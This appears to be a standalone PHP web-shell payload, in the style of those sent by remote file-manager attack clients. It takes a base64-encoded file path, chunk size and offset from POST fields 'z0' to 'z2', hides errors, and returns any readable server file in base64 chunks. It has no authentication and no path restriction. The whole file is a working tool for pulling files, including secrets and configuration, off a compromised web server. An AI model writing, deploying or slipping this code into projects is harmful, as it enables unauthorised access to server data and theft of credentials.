<?php

@ini_set('display_errors','0');
@set_time_limit(0);
$szPath = base64_decode($_POST['z0']);
$szChunkSize = base64_decode($_POST['z1']);
$szOffset = base64_decode($_POST['z2']);

$nChunkSize = (int)$szChunkSize;
$nOffset = (int)$szOffset;

if (file_exists($szPath)) {
    $nFileSize = filesize($szPath);
    if ($nOffset >= $nFileSize)
        die("2|");

    $handle = fopen($szPath, "rb");
    if ($handle == false) {
        die("0|ERROR://Cannot open: ".$szPath);
    }

    if (fseek($handle, $nOffset, SEEK_SET) != 0) {
        die("0|ERROR://Cannot seek to: ".$szOffset);
    }

    $data = fread($handle, $nChunkSize);
    if ($data === false) {
        die("0|ERROR://Cannot read chunk size of ".$szChunkSize);
    }

    fclose($handle);

    echo "1|".base64_encode($data);
} else {
    echo("0|ERROR://".$szPath."not existed!");
}

?>